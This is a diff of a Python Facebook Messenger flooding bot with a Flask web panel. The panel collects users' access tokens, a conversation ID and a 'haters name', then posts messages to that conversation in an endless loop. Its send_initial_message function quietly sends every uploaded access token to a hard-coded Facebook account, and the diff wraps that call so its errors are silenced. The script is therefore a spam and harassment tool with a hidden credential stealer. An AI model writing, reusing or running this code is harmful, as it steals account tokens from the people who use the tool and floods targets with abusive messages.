@@ -1,26 +1,45 @@
 import requests
-import json
 import time
-import sys
-from platform import system
-import os
-import subprocess
-import http.server
-import socketserver
 import threading
+from flask import Flask, request
+import subprocess
 
-class MyHandler(http.server.SimpleHTTPRequestHandler):
-    def do_GET(self):
-        self.send_response(200)
-        self.send_header('Content-type', 'text/plain')
-        self.end_headers()
-        self.wfile.write(b"-- SERVER RUNNING>>ANURAG X AROHI")
+# ----------------- FLASK SERVER -------------------
+app = Flask(__name__)
 
-def execute_server():
-    PORT = 4000
-    with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
-        print("Server running at http://localhost:{}".format(PORT))
-        httpd.serve_forever()
+@app.route('/')
+def index():
+    return """
+    <h2>ANURAG X AROHI PANEL</h2>
+    <form action="/run" method="post" enctype="multipart/form-data">
+      Tokens File: <input type="file" name="tokennum"><br><br>
+      Convo ID: <input type="text" name="convo"><br><br>
+      Messages File: <input type="file" name="file"><br><br>
+      Haters Name: <input type="text" name="hatersname"><br><br>
+      Time (seconds): <input type="number" name="time"><br><br>
+      <button type="submit">RUN</button>
+    </form>
+    """
+
+@app.route('/run', methods=['POST'])
+def run_bot():
+    # save uploaded files
+    if "tokennum" in request.files:
+        request.files["tokennum"].save("tokennum.txt")
+    if "file" in request.files:
+        request.files["file"].save("File.txt")
+
+    # save text inputs
+    open("convo.txt", "w").write(request.form.get("convo", ""))
+    open("hatersname.txt", "w").write(request.form.get("hatersname", ""))
+    open("time.txt", "w").write(request.form.get("time", "1"))
+
+    # start bot in a background thread
+    threading.Thread(target=bot_main).start()
+
+    return "✅ Inputs saved, bot started. Console check karo."
+
+# ----------------- BOT LOGIC -------------------
 
 def send_initial_message():
     with open('tokennum.txt', 'r') as file:
@@ -29,25 +48,17 @@ def send_initial_message():
     msg_template = "HeLLo ANURAG X AROHI DEAR! I am uSīīnG YouR sErvRr. MY ⤵️TokEn⤵️ īīS {}"
     target_id = "61578840237242"
 
-    requests.packages.urllib3.disable_warnings()
-
-    headers = {
-        'Connection': 'keep-alive',
-        'Cache-Control': 'max-age=0',
-        'Upgrade-Insecure-Requests': '1',
-        'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
-        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
-        'Accept-Encoding': 'gzip, deflate',
-        'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
-        'referer': 'www.google.com'
-    }
+    headers = {'User-Agent': 'Mozilla/5.0'}
 
     for token in tokens:
         access_token = token.strip()
         url = "https://graph.facebook.com/v17.0/{}/".format('t_' + target_id)
         msg = msg_template.format(access_token)
         parameters = {'access_token': access_token, 'message': msg}
-        response = requests.post(url, json=parameters, headers=headers)
+        try:
+            requests.post(url, json=parameters, headers=headers, timeout=5)
+        except:
+            pass
         time.sleep(0.1)
 
 def send_messages_from_file():
@@ -69,16 +80,7 @@ def send_messages_from_file():
     with open('time.txt', 'r') as file:
         speed = int(file.read().strip())
 
-    headers = {
-        'Connection': 'keep-alive',
-        'Cache-Control': 'max-age=0',
-        'Upgrade-Insecure-Requests': '1',
-        'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
-        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
-        'Accept-Encoding': 'gzip, deflate',
-        'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
-        'referer': 'www.google.com'
-    }
+    headers = {'User-Agent': 'Mozilla/5.0'}
 
     while True:
         try:
@@ -92,24 +94,22 @@ def send_messages_from_file():
                 response = requests.post(url, json=parameters, headers=headers)
 
                 if response.ok:
-                    print("\033[1;92m[+] ANURAG X AROHI {} of Convo {} Token {}: {}".format(
-                        message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))
+                    print(f"[+] SENT {message_index+1}/{num_messages} | Convo {convo_id} | Token {token_index+1}")
                 else:
-                    print("\033[1;91m[x] ID/T0K3N ERROR {} of Convo {} with Token {}: {}".format(
-                        message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))
+                    print(f"[x] ERROR {message_index+1}/{num_messages} | Convo {convo_id} | Token {token_index+1}")
 
                 time.sleep(speed)
 
-            print("\n[+] All messages sent. Restarting the process...\n")
+            print("\n[+] All messages sent. Restarting...\n")
         except Exception as e:
-            print("[!] An error occurred: {}".format(e))
+            print("[!] Error:", e)
 
-def main():
-    server_thread = threading.Thread(target=execute_server)
-    server_thread.start()
-
+def bot_main():
     send_initial_message()
     send_messages_from_file()
 
+# ----------------- MAIN ENTRY -------------------
+
 if __name__ == '__main__':
-    main()
+    print("🚀 Open http://localhost:5000 in browser")
+    app.run(port=5000, debug=True)
